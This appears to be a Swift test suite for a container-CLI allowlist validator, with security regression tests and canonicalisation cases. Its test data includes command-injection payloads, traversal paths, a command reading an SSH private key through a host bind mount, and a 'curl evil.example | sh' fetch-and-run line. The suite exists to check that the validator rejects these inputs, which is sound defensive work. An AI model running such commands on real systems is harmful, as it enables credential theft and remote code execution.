import Foundation
import Testing
@testable import FlotillaCore

private struct AllowedCase {
    let input: [String]
    let canonical: [String]
    let mutates: Bool
    let timeout: TimeInterval

    init(_ input: [String],
         canonical: [String]? = nil,
         mutates: Bool,
         timeout: TimeInterval = 30) {
        self.input = input
        self.canonical = canonical ?? input
        self.mutates = mutates
        self.timeout = timeout
    }
}

private func requireRejected(
    _ args: [String],
    sourceLocation: SourceLocation = #_sourceLocation
) {
    if case .success(let command) = Allowlist.validate(args) {
        Issue.record(
            "Unexpectedly accepted \(args) as \(command.arguments)",
            sourceLocation: sourceLocation
        )
    }
}

@Test func defaultDenyRejectsMissingAndUnknownSubcommands() {
    let rejected: [[String]] = [
        [],
        [""],
        [" "],
        ["\t"],
        ["unknown"],
        ["exec", "victim", "id"],
        ["restart", "victim"],
        ["image"],
        ["image", "push", "alpine"],
        ["system"],
        ["system", "start"],
    ]

    for args in rejected {
        requireRejected(args)
    }

    #expect(Allowlist.validate([]) == .failure(.emptyCommand))
    #expect(Allowlist.validate(["image", "push", "alpine"]) == .failure(.unknownSubcommand("image push")))
}

@Test func rejectsShellSyntaxInOperands() {
    let payloads = [
        "victim;id",
        "victim|id",
        "victim&id",
        "victim`id`",
        "victim$(id)",
        "victim\nid",
        "victim\rid",
    ]

    for payload in payloads {
        requireRejected(["inspect", payload])
        requireRejected(["image", "pull", "alpine\(payload)"])
    }
}

@Test func rejectsShellSyntaxInStructuredFlagValues() {
    let payloads = [
        "victim;id",
        "victim|id",
        "victim&id",
        "victim`id`",
        "victim$(id)",
        "victim\nid",
    ]

    for payload in payloads {
        requireRejected(["run", "--name", payload, "alpine"])
        requireRejected(["run", "--network=\(payload)", "alpine"])
        requireRejected(["image", "pull", "--platform", "linux/\(payload)", "alpine"])
    }
}

@Test func rejectsTraversalAndAbsolutePathsWhereIdentifiersOrImagesAreRequired() {
    let forbiddenOperands = [
        "../victim",
        "safe/../victim",
        "./victim",
        "/tmp/victim",
        "/",
    ]

    for operand in forbiddenOperands {
        requireRejected(["inspect", operand])
        requireRejected(["volume", "inspect", operand])
        requireRejected(["network", "inspect", operand])
        requireRejected(["image", "pull", operand])
    }

    requireRejected(["run", "--volume", "../host:/data:ro", "alpine"])
    requireRejected(["run", "--volume", "/tmp/../etc:/data:ro", "alpine"])
    requireRejected(["run", "--volume", "/tmp:/data/../escape:ro", "alpine"])
    requireRejected(["run", "--volume", "/:/data:ro", "alpine"])
    requireRejected(["run", "--volume", "/tmp:/:ro", "alpine"])
}

@Test func arbitraryHostBindMountCannotBypassTheRemoteExecutionBoundary() {
    // SECURITY REGRESSION: this currently fails. A compromised client can bind-mount
    // any host tree except "/" and combine it with the deliberately permissive
    // in-container command tail. That permits remote reads from /Users (and writes to
    // other sensitive paths with :rw), which bypasses the intended Q1 containment even
    // though the spawned process itself is the allowlisted `container run`.
    requireRejected([
        "run",
        "--volume", "/Users:/host:ro",
        "alpine",
        "sh", "-c", "cat /host/victim/.ssh/id_ed25519",
    ])
}

@Test func acceptsOnlyDeclaredFlagGrammarAndCanonicalisesSpellings() throws {
    let separated = try Allowlist.validated(["ls", "--format", "json", "-a", "-q"])
    let inline = try Allowlist.validated(["ls", "--format=json", "--all", "--quiet"])
    #expect(separated == inline)
    #expect(inline.arguments == ["ls", "--format", "json", "--all", "--quiet"])

    requireRejected(["ls", "--wat"])
    requireRejected(["ls", "-z"])
    requireRejected(["ls", "-aq"])
    requireRejected(["logs", "-n5", "victim"])
    requireRejected(["logs", "-n=5", "victim"])
    requireRejected(["ls", "--all=true"])
    requireRejected(["ls", "--format"])
    requireRejected(["run", "--name"])
    requireRejected(["run", "--name", "--detach", "alpine"])
    requireRejected(["ls", "--all", "--all"])
    requireRejected(["ls", "-a", "--all"])

    let afterOperand = try Allowlist.validated(["stop", "one", "--time=5", "two", "-s", "TERM"])
    #expect(afterOperand.arguments == ["stop", "--time", "5", "--signal", "TERM", "one", "two"])
}

@Test func repeatableFlagsAreBoundedAndCanonicalised() throws {
    let accepted = ["run"] + (1...24).flatMap { ["-e", "KEY\($0)=value"] } + ["alpine"]
    let command = try Allowlist.validated(accepted)
    #expect(command.arguments.first == "run")
    #expect(command.arguments.filter { $0 == "--env" }.count == 24)
    #expect(command.arguments.last == "alpine")

    requireRejected(accepted.dropLast() + ["--env", "EXTRA=value", "alpine"])
    requireRejected(["run", "--detach", "-d", "alpine"])
    requireRejected(["volume", "create", "--label", "a=1", "--label=b=2",
                     "--label", "c=3", "--label", "d=4", "--label", "e=5",
                     "--label", "f=6", "--label", "g=7", "--label", "h=8",
                     "--label", "i=9", "vol"])
}

@Test func separatorAndTrailingCommandPolicyAreEnforced() throws {
    requireRejected(["inspect", "--", "victim"])
    requireRejected(["ls", "--"])
    requireRejected(["run", "--", "alpine", "id"])
    requireRejected(["run", "alpine", "--", "echo\nforged"])

    let implicit = try Allowlist.validated(["run", "alpine", "echo", "--rm", ";", "id"])
    let explicit = try Allowlist.validated(["run", "alpine", "--", "echo", "--rm", ";", "id"])
    #expect(implicit == explicit)
    #expect(explicit.arguments == ["run", "alpine", "--", "echo", "--rm", ";", "id"])

    let emptySeparator = try Allowlist.validated(["run", "alpine", "--"])
    #expect(emptySeparator.arguments == ["run", "alpine"])

    requireRejected(["run", "alpine"] + Array(repeating: "x", count: 25))
}

@Test func operandMinimumMaximumAndWaiversAreEnforced() throws {
    requireRejected(["inspect"])
    requireRejected(["start"])
    requireRejected(["stop"])
    requireRejected(["delete"])
    requireRejected(["run"])
    requireRejected(["image", "pull"])
    requireRejected(["volume", "create"])
    requireRejected(["network", "create"])

    _ = try Allowlist.validated(["stop", "--all"])
    _ = try Allowlist.validated(["delete", "-a"])
    _ = try Allowlist.validated(["image", "rm", "--all"])
    _ = try Allowlist.validated(["volume", "delete", "--all"])
    _ = try Allowlist.validated(["network", "rm", "--all"])

    requireRejected(["inspect"] + (1...33).map { "c\($0)" })
    requireRejected(["logs", "one", "two"])
    requireRejected(["image", "pull", "alpine", "busybox"])
    requireRejected(["volume", "create", "one", "two"])
    requireRejected(["network", "create", "one", "two"])
}

@Test func structuralLimitsRejectPathologicalArgvBeforeParsing() {
    let defaults = Allowlist.Limits.default
    requireRejected(Array(repeating: "ls", count: defaults.maxArgumentCount + 1))
    requireRejected(["inspect", String(repeating: "a", count: defaults.maxArgumentLength + 1)])

    let totalLimits = Allowlist.Limits(
        maxArgumentCount: 10,
        maxArgumentLength: 10,
        maxTotalLength: 8
    )
    #expect(
        Allowlist.validate(["inspect", "ab"], limits: totalLimits)
            == .failure(.commandTooLong(length: 9, limit: 8))
    )

    let countLimits = Allowlist.Limits(maxArgumentCount: 2, maxArgumentLength: 100, maxTotalLength: 100)
    #expect(
        Allowlist.validate(["run", "alpine", "id"], limits: countLimits)
            == .failure(.tooManyArguments(count: 3, limit: 2))
    )

    let lengthLimits = Allowlist.Limits(maxArgumentCount: 3, maxArgumentLength: 4, maxTotalLength: 100)
    #expect(
        Allowlist.validate(["inspect", "safe"], limits: lengthLimits)
            == .failure(.argumentTooLong(length: 7, limit: 4))
    )
}

@Test func rejectsUnicodeLookalikesInvisibleCharactersAndCaseVariants() {
    let unknownSubcommands = [
        "LS",
        "List",
        "İnspect",
        "іnspect", // Cyrillic small i
        "ｌｓ",     // full-width Latin letters
        "ls\u{200B}",
    ]
    for subcommand in unknownSubcommands {
        requireRejected([subcommand])
    }

    requireRejected(["Image", "pull", "alpine"])
    requireRejected(["image", "Pull", "alpine"])
    requireRejected(["inspect", "аlpine"]) // Cyrillic small a
    requireRejected(["inspect", "Ａlpine"]) // full-width A
    requireRejected(["inspect", "safe\u{202E}evil"])
    requireRejected(["image", "pull", "alpine\u{00A0}:latest"])
}

@Test func mutationClassificationMatchesTheSecurityPolicy() {
    let expectedMutating: Set<String> = [
        "start", "stop", "kill", "delete", "rm", "prune", "run",
        // Writes the host filesystem in one direction and reads it in the other.
        "copy",
        // A machine IS the VM every container on the host runs inside. `machine delete`
        // destroys that substrate, so nothing here is a convenience mutation.
        "machine create", "machine set", "machine stop", "machine delete", "machine run",
        "machine set-default",
        "image pull", "image delete", "image rm", "image prune", "image tag",
        "volume create", "volume delete", "volume rm", "volume prune",
        "network create", "network delete", "network rm", "network prune",
    ]
    let actualMutating = Set(Allowlist.commands.filter(\.mutates).map(\.name))
    #expect(actualMutating == expectedMutating)

    let expectedReadOnly: Set<String> = [
        "machine list", "machine inspect", "machine logs",
        "ls", "list", "inspect", "stats", "logs",
        "image list", "image inspect",
        "volume list", "volume inspect",
        "network list", "network inspect",
        "system status", "system version", "system df",
        // `exec` is read-only because the ONLY command it permits is a `ps` — see
        // TrailingPolicy.exact. If this ever moves to the mutating set, someone has widened
        // what exec can run, and that needs a fresh security review, not a test update.
        "exec",
    ]
    let actualReadOnly = Set(Allowlist.commands.filter { !$0.mutates }.map(\.name))
    #expect(actualReadOnly == expectedReadOnly)
    #expect(expectedMutating.isDisjoint(with: expectedReadOnly))
    #expect(expectedMutating.union(expectedReadOnly).count == Allowlist.commands.count)
}

@Test func everyAllowlistedCommandShapeProducesItsCanonicalCommand() throws {
    let digest = String(repeating: "a", count: 64)
    let cases: [AllowedCase] = [
        AllowedCase(["ls", "-a", "--format=json", "-q"],
                    canonical: ["ls", "--all", "--format", "json", "--quiet"], mutates: false),
        AllowedCase(["list"], mutates: false),
        AllowedCase(["inspect", "one", "two"], mutates: false),
        AllowedCase(["stats", "--no-stream", "--format", "table", "one"], mutates: false),
        AllowedCase(["logs", "--boot", "-n", "100", "one"], mutates: false),

        AllowedCase(["start", "one"], mutates: true, timeout: 120),
        AllowedCase(["stop", "-a", "-t", "10", "-s", "SIGTERM"],
                    canonical: ["stop", "--all", "--time", "10", "--signal", "SIGTERM"],
                    mutates: true, timeout: 120),
        AllowedCase(["delete", "-f", "one"], canonical: ["delete", "--force", "one"],
                    mutates: true, timeout: 120),
        AllowedCase(["rm", "--all"], mutates: true, timeout: 120),
        AllowedCase(["kill", "-a", "-s", "TERM"],
                    canonical: ["kill", "--all", "--signal", "TERM"],
                    mutates: true, timeout: 30),
        AllowedCase(["prune"], mutates: true, timeout: 120),
        AllowedCase(
            ["run", "-d", "--rm", "--name=friendly", "-e", "KEY=value", "-p", "8080:80/tcp",
             "-v", "/tmp/data:/data:ro", "-c", "4", "-m", "512MB", "--network", "bridge",
             "--platform", "linux/arm64/v8", "registry.example/alpine:latest", "echo", "hello"],
            canonical: ["run", "--detach", "--rm", "--name", "friendly", "--env", "KEY=value",
                        "--publish", "8080:80/tcp", "--volume", "/tmp/data:/data:ro",
                        "--cpus", "4", "--memory", "512MB", "--network", "bridge",
                        "--platform", "linux/arm64/v8", "registry.example/alpine:latest",
                        "--", "echo", "hello"],
            mutates: true,
            timeout: 600
        ),

        AllowedCase(["image", "list", "-q", "--format=yaml"],
                    canonical: ["image", "list", "--quiet", "--format", "yaml"], mutates: false),
        AllowedCase(["image", "inspect", "alpine", "docker.io/library/alpine:latest"], mutates: false),
        AllowedCase(["image", "pull", "--platform=linux/arm64", "alpine@sha256:\(digest)"],
                    canonical: ["image", "pull", "--platform", "linux/arm64",
                                "alpine@sha256:\(digest)"],
                    mutates: true, timeout: 1800),
        AllowedCase(["image", "delete", "-a"], canonical: ["image", "delete", "--all"],
                    mutates: true),
        AllowedCase(["image", "rm", "-f", "alpine"], canonical: ["image", "rm", "--force", "alpine"],
                    mutates: true),
        AllowedCase(["image", "prune", "-a"], canonical: ["image", "prune", "--all"],
                    mutates: true, timeout: 120),
        AllowedCase(["image", "tag", "alpine:latest", "alpine:mine"], mutates: true),

        AllowedCase(["machine", "list", "--format", "json"], mutates: false),
        AllowedCase(["machine", "inspect", "dev"], mutates: false),
        AllowedCase(["machine", "logs", "-n", "50", "--boot", "dev"], mutates: false),
        AllowedCase(["machine", "create", "-n", "dev", "--cpus", "4", "--memory", "8G",
                     "--home-mount", "ro", "alpine:3.22"],
                    canonical: ["machine", "create", "--name", "dev", "--cpus", "4",
                                "--memory", "8G", "--home-mount", "ro",
                                "alpine:3.22"],
                    mutates: true, timeout: 600),
        AllowedCase(["machine", "set", "-n", "dev", "cpus=4", "memory=8G", "home-mount=ro"],
                    canonical: ["machine", "set", "--name", "dev", "cpus=4", "memory=8G",
                                "home-mount=ro"],
                    mutates: true),
        // The boot no-op. `mutates: true` because it starts a VM.
        //
        // A `--` in the input is consumed and **not** re-emitted: `.exact` trailing does not
        // carry the separator the way `.command` does. Both spellings were run against the
        // live CLI on 3 August and both boot the machine and exit 0, so the canonical form is
        // simply the shorter one — checked rather than assumed, since the first draft of this
        // case asserted the opposite and would have been "green" either way.
        AllowedCase(["machine", "run", "-n", "dev", "--", "/bin/true"],
                    canonical: ["machine", "run", "--name", "dev", "/bin/true"],
                    mutates: true, timeout: 300),
        AllowedCase(["machine", "stop", "dev"], mutates: true, timeout: 120),
        AllowedCase(["machine", "delete", "dev"], mutates: true, timeout: 120),
        AllowedCase(["machine", "set-default", "dev"], mutates: true),

        // Host end gated by MountPolicy — see the `container copy` tests below.
        AllowedCase(["copy", "web:/etc/hostname", "/tmp/flotilla/hostname"],
                    mutates: true, timeout: 120),

        AllowedCase(["volume", "list", "--format", "toml"], mutates: false),
        AllowedCase(["volume", "inspect", "data"], mutates: false),
        // Canonicalises to `-s`, NOT `--size`: the CLI has no long form for it. This case
        // previously asserted `--size` and so encoded the bug rather than catching it.
        AllowedCase(["volume", "create", "-s", "2GB", "--opt", "type=fast",
                     "--label=team=infra", "data"],
                    canonical: ["volume", "create", "-s", "2GB", "--opt", "type=fast",
                                "--label", "team=infra", "data"], mutates: true),
        AllowedCase(["volume", "delete", "--all"], mutates: true),
        AllowedCase(["volume", "rm", "data"], mutates: true),
        AllowedCase(["volume", "prune"], mutates: true, timeout: 120),

        AllowedCase(["network", "list", "-q"], canonical: ["network", "list", "--quiet"],
                    mutates: false),
        AllowedCase(["network", "inspect", "private"], mutates: false),
        AllowedCase(["network", "create", "--internal", "--subnet", "10.0.0.0/24",
                     "--label", "team=infra", "--option=mtu=1500", "private"],
                    canonical: ["network", "create", "--internal", "--subnet", "10.0.0.0/24",
                                "--label", "team=infra", "--option", "mtu=1500", "private"],
                    mutates: true, timeout: 60),
        AllowedCase(["network", "delete", "-a"], canonical: ["network", "delete", "--all"],
                    mutates: true),
        AllowedCase(["network", "rm", "private"], mutates: true),
        AllowedCase(["network", "prune"], mutates: true, timeout: 120),

        AllowedCase(["system", "status", "--format=json"],
                    canonical: ["system", "status", "--format", "json"], mutates: false),
        AllowedCase(["system", "version"], mutates: false),
        AllowedCase(["system", "df", "--format", "table"], mutates: false),

        // The separator is required on input but DROPPED from the canonical argv: the real
        // `container exec` treats `--` as the program name and fails on it. Caught by running
        // the CLI, not by a unit test, which is why the canonical form is pinned here.
        AllowedCase(["exec", "web", "--", "ps", "-o", "pid,comm,args"],
                    canonical: ["exec", "web", "ps", "-o", "pid,comm,args"],
                    mutates: false, timeout: 15),
    ]

    #expect(cases.count == Allowlist.commands.count)
    // These are the *positive* shapes, so the `run` case deliberately includes a host
    // bind mount. Since `MountPolicy.denyHostPaths` is the default, the legitimate case
    // has to name a policy that permits it — which is the point: a host mount is
    // authorised by the filesystem owner's policy, never by the command's grammar.
    let policy = MountPolicy.roots(["/tmp"])
    for testCase in cases {
        let command = try Allowlist.validated(testCase.input, mountPolicy: policy)
        let pathLength = command.subcommand.count
        #expect(command.subcommand == Array(testCase.canonical.prefix(pathLength)))
        #expect(command.arguments == testCase.canonical)
        #expect(command.mutates == testCase.mutates)
        #expect(command.timeoutHint == testCase.timeout)
        #expect(command.auditDescription == (["container"] + testCase.canonical).joined(separator: " "))
    }
}

// MARK: - exec is locked to one command
//
// The process list needs `container exec <id> ps`. Allowlisting `exec` at all is the risky
// part: with `.command(maxTokens:)` it would also permit `exec <id> sh`, an interactive shell
// inside the container — precisely the "generic remote shell" the transport decision rules
// out, and far worse in Phase 2 where the caller is a remote peer. `TrailingPolicy.exact` is
// what keeps the grant narrow, so these tests exist to stop anyone widening it by accident.

@Test func execPermitsExactlyTheProcessListing() throws {
    let validated = try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args"])
    #expect(validated.subcommand == ["exec"])
    #expect(validated.mutates == false)     // a ps changes nothing
}

@Test func execRefusesAShell() throws {
    // The whole reason `.exact` exists.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "sh"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "/bin/bash", "-c", "curl evil.example | sh"])
    }
}

@Test func execRefusesAnythingButTheExactTokens() throws {
    // A superset...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args", "--forest"])
    }
    // ...a subset...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps"])
    }
    // ...a reordering...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps", "pid,comm,args", "-o"])
    }
    // ...a different ps format...
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args,uid"])
    }
    // ...and nothing at all.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web"])
    }
}

@Test func execStillRequiresAValidContainerIdentifier() throws {
    // The operand shape is unchanged by the trailing policy — a Unicode lookalike or a
    // traversal in the id must still be rejected.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "../etc", "--", "ps", "-o", "pid,comm,args"])
    }
}

// MARK: - IPv6 prefixes
//
// `--subnet-v6` needs its own shape: accepting either family wherever one is expected would
// let an IPv6 prefix reach `--subnet` and vice versa, which the CLI then rejects far less
// clearly than we can. The validator is hand-rolled because FlotillaCore stays
// Foundation-only, so it is worth attacking properly.

@Test func ipv6PrefixesAreAccepted() throws {
    for good in ["fd00:1234::/64", "fd6d:1605:d4b8:ad0f::/64", "2001:db8::/32",
                 "::/0", "fe80::1/128", "1:2:3:4:5:6:7:8/128"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["network", "create", "--subnet-v6", good, "net"])
        }
    }
}

@Test func malformedIPv6PrefixesAreRejected() throws {
    for bad in [
        "fd00:1234::",              // no prefix length
        "fd00:1234::/",             // empty prefix length
        "fd00:1234::/129",          // out of range
        "fd00:1234::/-1",           // negative
        "fd00::1::2/64",            // two elisions
        "fd00:::1/64",              // triple colon
        "fd00:12345::/64",          // group too long
        "fd00:zzzz::/64",           // not hex
        "1:2:3:4:5:6:7/64",         // too few groups, no elision
        "1:2:3:4:5:6:7:8:9/64",     // too many groups
        "10.0.0.0/24",              // an IPv4 range must NOT satisfy the v6 shape
        "fd00:1234::/64 extra",     // trailing junk
        "",                         // empty
    ] {
        #expect(throws: (any Error).self, "should reject \(bad)") {
            try Allowlist.validated(["network", "create", "--subnet-v6", bad, "net"])
        }
    }
}

@Test func theTwoAddressFamiliesDoNotAcceptEachOther() throws {
    // The whole reason `.cidrV6` is a separate shape.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["network", "create", "--subnet", "fd00:1234::/64", "net"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["network", "create", "--subnet-v6", "10.0.0.0/24", "net"])
    }
    // Both together is legitimate — a dual-stack network.
    #expect(throws: Never.self) {
        try Allowlist.validated([
            "network", "create", "--subnet", "10.10.0.0/24", "--subnet-v6", "fd00:1234::/64", "net"
        ])
    }
}

// MARK: - `volume create -s` has no long form

@Test func volumeSizeCanonicalisesToTheShortFlagOnly() throws {
    // The CLI rejects `--size` outright; only `-s` exists. Since `canonicalSpelling` prefers
    // a long name when one is declared, declaring one here silently produced an argv the CLI
    // would refuse. This pins the emitted spelling.
    let validated = try Allowlist.validated(["volume", "create", "-s", "64M", "data"])
    #expect(validated.arguments == ["volume", "create", "-s", "64M", "data"])
    #expect(validated.arguments.contains("--size") == false)
}

@Test func volumeSizeRejectsTheLongFormJustAsTheCLIDoes() throws {
    // Better to refuse it here, where the message names the rule, than to pass it through
    // and have the CLI answer with a usage dump.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["volume", "create", "--size", "64M", "data"])
    }
}

// MARK: - the review's allowlist audit, applied
//
// All three verified against the live CLI before being fixed, not taken on the help text alone.

@Test func startTakesExactlyOneContainer() throws {
    // `container start idle cache` is refused with "Unexpected argument 'cache'". The table
    // previously allowed 32 operands and so canonicalised a command the CLI rejects.
    #expect(throws: Never.self) { try Allowlist.validated(["start", "web"]) }
    #expect(throws: (any Error).self) { try Allowlist.validated(["start", "web", "cache"]) }
    // The genuinely plural ones must keep working.
    #expect(throws: Never.self) { try Allowlist.validated(["stop", "web", "cache"]) }
    #expect(throws: Never.self) { try Allowlist.validated(["rm", "web", "cache"]) }
}

@Test func aBarePortIsNotAValidPublishValue() throws {
    // The CLI refuses `-p 9998` with `invalid publish value: 9998`. Our shape accepted it,
    // making it LOOSER than the CLI — the one direction that matters, since a too-loose shape
    // lets invalid input cross the boundary that Phase 2 exposes to a remote caller.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["run", "-p", "9998", "alpine"])
    }
    // The real forms still pass.
    for good in ["8080:80", "8080:80/tcp", "127.0.0.1:8080:80", "127.0.0.1:8080:80/udp"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["run", "-p", good, "alpine"])
        }
    }
}

@Test func memoryAcceptsEveryDocumentedSuffix() throws {
    // K, M, G, T, P are all documented; T and P were rejected. Verified: `-m 1T` and `-m 1P`
    // both run.
    for good in ["512K", "512M", "2G", "1T", "1P", "1024"] {
        #expect(throws: Never.self, "should accept \(good)") {
            try Allowlist.validated(["run", "-m", good, "alpine"])
        }
    }
    #expect(throws: (any Error).self) { try Allowlist.validated(["run", "-m", "2X", "alpine"]) }
    #expect(throws: (any Error).self) { try Allowlist.validated(["run", "-m", "0", "alpine"]) }
}

// MARK: - ExecPolicy
//
// The Terminal tab needs `exec <id> sh`, which the default allowlist refuses on purpose. These
// pin both halves: that the refusal is still the default, and that opting in does not quietly
// widen anything else. The asymmetry IS the feature — a host serving a remote peer keeps the
// strict grammar while the machine's own owner gets a shell.

@Test("By default a shell inside a container is refused")
func defaultExecPolicyRefusesAShell() {
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "sh"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["exec", "web", "--", "sh"], execPolicy: .processListOnly)
    }
}

@Test("The default still permits exactly the process-list query")
func defaultExecPolicyStillAllowsTheProcessList() throws {
    let validated = try Allowlist.validated(["exec", "web", "--", "ps", "-o", "pid,comm,args"])
    #expect(validated.arguments == ["exec", "web", "ps", "-o", "pid,comm,args"])
}

@Test("interactiveShell permits a shell, and emits NO -- separator")
func interactiveShellPermitsAShellWithoutASeparator() throws {
    let validated = try Allowlist.validated(["exec", "-i", "-t", "web", "--", "sh"],
                                            execPolicy: .interactiveShell)
    // The separator is required on input so parsing stays unambiguous, and must be absent
    // from the argv we execute: `container exec web -- sh` fails with "failed to find target
    // executable --". Verified against the live CLI, and invisible to a test that only
    // checks the command was built.
    #expect(!validated.arguments.contains("--"))
    #expect(validated.arguments == ["exec", "--interactive", "--tty", "web", "sh"])
}

@Test("interactiveShell widens exec and nothing else")
func interactiveShellDoesNotWidenOtherCommands() {
    // `run` still refuses a host bind mount under the default mount policy: two independent
    // boundaries, and opting into one must not relax the other.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["run", "--volume", "/Users:/host", "alpine"],
                                execPolicy: .interactiveShell)
    }
    // An unknown subcommand is still unknown.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["shell", "web"], execPolicy: .interactiveShell)
    }
}

@Test("interactiveShell still caps the command length")
func interactiveShellCapsTrailingTokens() {
    let tooMany = ["exec", "web", "--"] + Array(repeating: "x", count: 40)
    #expect(throws: (any Error).self) {
        try Allowlist.validated(tooMany, execPolicy: .interactiveShell)
    }
}

@Test("A ContainerCLI defaults to refusing shells")
func containerCLIDefaultsToStrictExec() {
    #expect(ContainerCLI(host: LocalHost()).execPolicy == .processListOnly)
}

// MARK: - container copy
//
// `copy` touches the real filesystem in both directions, so these pin that the host end is
// gated by MountPolicy and not merely well-formed. The dangerous direction is a too-loose
// shape, and in Phase 2 this grammar faces a remote caller.

@Test("copy refuses a host path the mount policy does not permit")
func copyRefusesUnpermittedHostPaths() {
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["copy", "web:/etc/passwd", "/Users/someone/stolen"],
                                mountPolicy: .denyHostPaths)
    }
}

@Test("copy accepts a host path inside a permitted root")
func copyAcceptsPermittedHostPaths() throws {
    let validated = try Allowlist.validated(
        ["copy", "web:/etc/hostname", "/tmp/flotilla/hostname"],
        mountPolicy: .roots(["/tmp/flotilla"])
    )
    #expect(validated.arguments == ["copy", "web:/etc/hostname", "/tmp/flotilla/hostname"])
}

@Test("copy works in the upload direction too")
func copyAcceptsHostToContainer() throws {
    let validated = try Allowlist.validated(
        ["copy", "/tmp/flotilla/a.conf", "web:/etc/a.conf"],
        mountPolicy: .roots(["/tmp/flotilla"])
    )
    #expect(validated.arguments.count == 3)
}

@Test("copy refuses the filesystem root, traversal, and malformed endpoints")
func copyRefusesDangerousEndpoints() {
    for argv in [["copy", "web:/etc", "/"],
                 ["copy", "web:/etc/../../x", "/tmp/flotilla/x"],
                 ["copy", "web:", "/tmp/flotilla/x"],
                 ["copy", "not an identifier:/x", "/tmp/flotilla/x"],
                 ["copy", "web:relative/path", "/tmp/flotilla/x"]] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(argv, mountPolicy: .roots(["/tmp/flotilla"]))
        }
    }
}

@Test("copy needs exactly two endpoints")
func copyNeedsTwoOperands() {
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["copy", "web:/etc/hostname"], mountPolicy: .unrestricted)
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["copy", "web:/a", "/tmp/b", "/tmp/c"], mountPolicy: .unrestricted)
    }
}

@Test("The Files tab's directory listing is accepted and canonicalises correctly")
func directoryListingArgvIsAccepted() throws {
    // What `ContainerCLI.listDirectory` builds. The inner `--` is for `ls`, not for us: it
    // stops a filename beginning with `-` being read as an ls flag.
    let validated = try Allowlist.validated(
        ["exec", "web", "--", "ls", "-la", "--", "/usr/share/nginx/html"],
        execPolicy: .interactiveShell
    )
    // Exactly one separator is consumed as grammar; `exec` receives none at all.
    #expect(validated.arguments == ["exec", "web", "ls", "-la", "--", "/usr/share/nginx/html"])
}

// MARK: - container machine
//
// A machine is the VM every container on the host runs inside, so these leaves are not ordinary
// additions. `research/VM-SECURITY-REVIEW.md` requires that unknown `set` keys be refused rather
// than forwarded, and that each leaf's own calling convention be encoded rather than inferred
// from the family — the conventions genuinely differ, which is the `volume create --size` trap.

@Test("machine set accepts exactly the three documented keys")
func machineSetAcceptsOnlyDocumentedKeys() throws {
    let validated = try Allowlist.validated(
        ["machine", "set", "-n", "dev", "cpus=4", "memory=8G", "home-mount=ro"])
    #expect(validated.arguments == ["machine", "set", "--name", "dev",
                                    "cpus=4", "memory=8G", "home-mount=ro"])
}

/// `machine create --home-mount` takes a **bare** `ro|rw|none`; `machine set` takes
/// `home-mount=ro` as an operand. Both spellings were live in the code at once — the allowlist
/// demanded the `key=value` form on create, which the CLI rejects, while the UI sent the form
/// the CLI wants, which the allowlist rejected. Creating a machine with a home-mount could not
/// succeed by either route.
///
/// The canonical-shape test passed throughout, because it asserted the same wrong spelling.
/// This one pins each leaf's form against the other's.
@Test("create and set spell home-mount differently, and each refuses the other's form")
func homeMountSpellingIsPerLeaf() throws {
    for mode in ["ro", "rw", "none"] {
        let validated = try Allowlist.validated(
            ["machine", "create", "--home-mount", mode, "alpine:3.22"])
        #expect(validated.arguments.contains(mode))
    }
    // The `set` spelling, on create.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "--home-mount", "home-mount=ro",
                                 "alpine:3.22"])
    }
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "create", "--home-mount", "readonly",
                                 "alpine:3.22"])
    }
    // The `create` spelling, on set.
    #expect(throws: (any Error).self) {
        try Allowlist.validated(["machine", "set", "-n", "dev", "ro"])
    }
}

/// `machine run` with no trailing command opens an interactive shell, which needs a PTY on the
/// calling side. Without one it fails with "Operation not supported by device" *after* booting
/// the VM, so a Start button reported failure on a successful start. `startMachine` appends
/// `/bin/true`; this pins that the grammar accepts that form.
@Test("starting a machine boots it with a command, never a bare interactive shell")
func startMachinePassesABootCommand() throws {
    let validated = try Allowlist.validated(["machine", "run", "--name", "dev",
                                             "--", "/bin/true"])
    #expect(validated.arguments.contains("/bin/true"))
}

@Test("machine set refuses an unknown key rather than forwarding it")
func machineSetRefusesUnknownKeys() {
    // The review's exact concern: "unknown future keys could silently add privilege". A key
    // this build has never heard of must not be passed through on the hope the CLI checks it.
    for setting in ["rosetta=true", "kernel=/tmp/vmlinux", "privileged=yes", "cpu=4", "mem=8G"] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(["machine", "set", "-n", "dev", setting])
        }
    }
}

@Test("home-mount accepts only ro, rw and none")
func homeMountDomainIsClosed() throws {
    for mode in ["ro", "rw", "none"] {
        _ = try Allowlist.validated(["machine", "set", "-n", "dev", "home-mount=\(mode)"])
    }
    // `home-mount` names a MODE, not a path — there is nothing for MountPolicy to check here.
    // Whether a remote caller may set it at all is an authorisation question the transport
    // answers, not a grammar one. See the note on `checkMachineSetting`.
    for bad in ["home-mount=readwrite", "home-mount=/Users/someone", "home-mount=", "home-mount=RW"] {
        #expect(throws: (any Error).self) {
            try Allowlist.validated(["machine", "set", "-n", "dev", bad])
        }
    }
}

